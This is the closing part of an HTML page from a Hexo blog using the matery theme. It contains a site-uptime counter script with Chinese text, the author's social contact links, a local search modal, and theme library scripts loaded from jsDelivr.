                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                        var diff = t2 - t1;
                        var diffYears = Math.floor(diff / years);
                        var diffDays = Math.floor((diff / days) - diffYears * 365);

                        // 区分是否有年份.
                        var language = 'zh-CN';
                        if (startYear === String(todayYear)) {
                            document.getElementById("year").innerHTML = todayYear;
                            var daysTip = 'This site has been running for ' + diffDays + ' days';
                            if (language === 'zh-CN') {
                                daysTip = '本站已运行 ' + diffDays + ' 天';
                            } else if (language === 'zh-HK') {
                                daysTip = '本站已運行 ' + diffDays + ' 天';
                            }
                            document.getElementById("sitetime").innerHTML = daysTip;
                        } else {
                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
                                + diffDays + ' days';
                            if (language === 'zh-CN') {
                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
                            } else if (language === 'zh-HK') {
                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
                            }
                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
                        }
                    }

                    calcSiteTime();
                </script>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/laobameishijia" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:994291043@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=994291043" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 994291043" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







</div>
    </div>
</footer>

<div class="progress-bar"></div>
<script language=javascript>
    function siteTime() {
        window.setTimeout("siteTime()", 1000);
        var seconds = 1000;
        var minutes = seconds * 60;
        var hours = minutes * 60;
        var days = hours * 24;
        var years = days * 365;
        var today = new Date();
        var todayYear = today.getFullYear();
        var todayMonth = today.getMonth() + 1;
        var todayDate = today.getDate();
        var todayHour = today.getHours();
        var todayMinute = today.getMinutes();
        var todaySecond = today.getSeconds();
        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
        year - 作为date对象的年份，为4位年份值
        month - 0-11之间的整数，做为date对象的月份
        day - 1-31之间的整数，做为date对象的天数
        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
        minutes - 0-59之间的整数，做为date对象的分钟数
        seconds - 0-59之间的整数，做为date对象的秒数
        microseconds - 0-999之间的整数，做为date对象的毫秒数 */
        var t1 = Date.UTC(2021, 05, 21, 00, 00, 00); //北京时间2018-2-13 00:00:00
        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
        var diff = t2 - t1;
        var diffYears = Math.floor(diff / years);
        var diffDays = Math.floor((diff / days) - diffYears * 365);
        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
        document.getElementById("sitetime").innerHTML = "本站已运行 " +diffYears+" 年 "+diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
    }/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
    siteTime();
</script>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/materialize/materialize.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/masonry/masonry.pkgd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/aos/aos.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

    
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/instantpage/instantpage.js" type="module"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
    

</body>

</html>
